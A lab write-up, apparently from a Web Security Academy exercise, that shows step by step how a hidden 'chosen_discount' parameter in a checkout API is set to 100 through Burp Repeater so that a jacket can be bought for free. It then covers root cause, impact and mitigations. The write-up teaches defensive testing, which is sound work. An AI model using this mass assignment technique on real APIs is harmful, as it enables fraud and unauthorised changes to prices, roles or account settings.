# Lab: Exploiting a Mass Assignment Vulnerability

## Description

This lab demonstrates how a **mass assignment vulnerability** can allow an attacker to modify hidden parameters that are not normally exposed through the application's user interface.

The checkout API accepted an additional `chosen_discount` parameter that was present in the API response but not included in the normal checkout request.

By adding this hidden parameter and setting the discount percentage to `100`, it was possible to purchase the **Lightweight "l33t" Leather Jacket** for free.

## Difficulty

Practitioner

## Vulnerability

Mass Assignment

## Category

API Testing

## Tools

- Burp Suite Professional
- Burp Proxy
- Burp Repeater
- Burp Browser

## Credentials

- Username: `wiener`
- Password: `peter`

## Objective

Identify a hidden parameter in the checkout API and exploit the mass assignment vulnerability to set the product discount to `100%` and purchase the **Lightweight "l33t" Leather Jacket**.

## Steps

### 1. Login to the Application

I logged in to the application using the provided credentials:

```text
Username: wiener
Password: peter
```

I then opened the **Lightweight "l33t" Leather Jacket** product and added it to the basket.

When attempting to place the order, the application indicated that there was not enough credit to complete the purchase.

### 2. Analyze the Checkout API

In Burp Suite, I opened:

```text
Proxy > HTTP history
```

I found two API requests related to the checkout functionality:

```http
GET /api/checkout
```

and:

```http
POST /api/checkout
```

I compared the GET response with the POST request.

### 3. Identify the Hidden Parameter

The response from:

```http
GET /api/checkout
```

contained a JSON structure with a parameter named:

```text
chosen_discount
```

For example:

```json
{
    "chosen_discount": {
        "percentage": 0
    },
    "chosen_products": [
        {
            "product_id": "1",
            "quantity": 1
        }
    ]
}
```

However, the normal checkout request did not include the `chosen_discount` parameter.

This was a strong indication that the API may be accepting a hidden parameter.

### 4. Send the Checkout Request to Repeater

I sent the:

```http
POST /api/checkout
```

request to **Burp Repeater**.

The original request contained the selected product:

```json
{
    "chosen_products": [
        {
            "product_id": "1",
            "quantity": 1
        }
    ]
}
```

### 5. Add the Hidden Parameter

I added the `chosen_discount` parameter to the request:

```json
{
    "chosen_discount": {
        "percentage": 0
    },
    "chosen_products": [
        {
            "product_id": "1",
            "quantity": 1
        }
    ]
}
```

The server accepted the additional parameter without rejecting the request.

This indicated that the hidden parameter was being processed by the API.

### 6. Test Parameter Validation

To confirm that the parameter was actually being processed, I changed the value of `percentage` from a number to a string:

```json
{
    "chosen_discount": {
        "percentage": "x"
    },
    "chosen_products": [
        {
            "product_id": "1",
            "quantity": 1
        }
    ]
}
```

The server returned an error indicating that the value was expected to be a number.

This confirmed that the server was actively processing the hidden parameter.

### 7. Exploit the Mass Assignment Vulnerability

I changed the discount percentage to:

```text
100
```

The final request body was:

```json
{
    "chosen_discount": {
        "percentage": 100
    },
    "chosen_products": [
        {
            "product_id": "1",
            "quantity": 1
        }
    ]
}
```

I sent the request through Burp Repeater.

### 8. Purchase the Product

I returned to the browser and continued with the checkout process.

The **Lightweight "l33t" Leather Jacket** was now available with a:

```text
100% discount
```

The product could therefore be purchased without sufficient account credit.

I completed the purchase and the lab was solved.

## Attack Flow

The complete attack can be summarized as:

```text
Analyze Checkout API
        ↓
Compare GET Response and POST Request
        ↓
Find Hidden Parameter
        ↓
chosen_discount
        ↓
Add Parameter to POST Request
        ↓
Test Parameter Type
        ↓
Confirm Server Processes Parameter
        ↓
Set percentage = 100
        ↓
100% Discount
        ↓
Purchase Product
        ↓
Lab Solved
```

## Why This Is a Mass Assignment Vulnerability

Mass assignment occurs when an application automatically maps user-controlled input to internal object properties without explicitly restricting which fields can be modified.

In this lab, the application exposed:

```text
chosen_discount
```

in the API response, but the normal client request did not include this field.

The API nevertheless accepted the field when it was manually added to the request.

This allowed a normal customer to control a value that should have been controlled by the server.

The intended behavior was effectively:

```text
Customer
    ↓
Select Product
    ↓
Checkout
```

But the vulnerable API allowed:

```text
Customer
    ↓
Modify hidden discount parameter
    ↓
chosen_discount = 100%
    ↓
Checkout
```

## Impact

A mass assignment vulnerability can allow attackers to modify sensitive properties that should not be controlled by normal users.

Depending on the application, this could potentially lead to:

- Unauthorized discounts
- Price manipulation
- Account privilege escalation
- Modification of user roles
- Unauthorized changes to account settings
- Business logic abuse
- Financial loss

In this lab, the vulnerability allowed a customer to apply a `100%` discount to a product.

## Root Cause

The root cause is insufficient server-side control over which properties can be modified through API input.

The application accepted:

```json
{
    "chosen_discount": {
        "percentage": 100
    }
}
```

even though the discount should not have been controlled by the customer.

The application effectively trusted a client-controlled property that should have been managed by server-side business logic.

## Mitigation

### 1. Use Allowlisting

Only allow specific properties to be accepted from user input.

For example, the checkout API should explicitly allow:

```text
chosen_products
```

but reject unauthorized properties such as:

```text
chosen_discount
```

### 2. Do Not Bind User Input Directly to Internal Objects

Avoid automatically mapping arbitrary JSON properties into application models.

Instead, explicitly define which fields can be modified.

### 3. Enforce Business Logic Server-Side

Sensitive values such as:

- Product prices
- Discounts
- Account balances
- User roles
- Permissions

should be determined and validated by the server.

### 4. Validate Authorization

Even if a parameter is syntactically valid, the application should verify whether the current user is authorized to modify it.

### 5. Test Hidden Parameters

During security testing, compare API responses with requests to identify parameters that may not be exposed in the normal UI but are still accepted by the backend.

## Key Takeaways

- API responses can reveal hidden parameters.
- Parameters not visible in the frontend may still be accepted by the backend.
- Comparing GET responses with POST, PUT, or PATCH requests can reveal mass assignment opportunities.
- Type validation errors can help confirm that a hidden parameter is actually being processed.
- Sensitive business logic must be enforced server-side.
- Client-controlled discount values should never be trusted.
- Mass assignment vulnerabilities can lead to serious business logic flaws and financial impact.

## Skills Practiced

- API Testing
- Mass Assignment
- Hidden Parameter Discovery
- API Reconnaissance
- Burp Suite Professional
- Burp Proxy
- Burp Repeater
- JSON Request Manipulation
- Parameter Validation Testing
- Business Logic Testing
- API Security
- Server-Side Validation

## Screenshots

Recommended screenshots:

1. Login page
2. Leather jacket product page
3. Insufficient credit message
4. `GET /api/checkout` response
5. `POST /api/checkout` request
6. `chosen_discount` hidden parameter
7. Modified checkout request
8. Type validation error
9. `percentage: 100` request
10. 100% discount applied
11. Successful purchase
12. Lab solved

> Redact passwords, session cookies, API tokens, and other sensitive information before publishing screenshots publicly.

## References

- PortSwigger Web Security Academy - API Testing
- PortSwigger Web Security Academy - Mass Assignment

## Tags

`API Testing`
`API Security`
`Mass Assignment`
`Hidden Parameters`
`API Reconnaissance`
`Business Logic`
`JSON`
`Burp Suite`
`Burp Repeater`
`Web Security`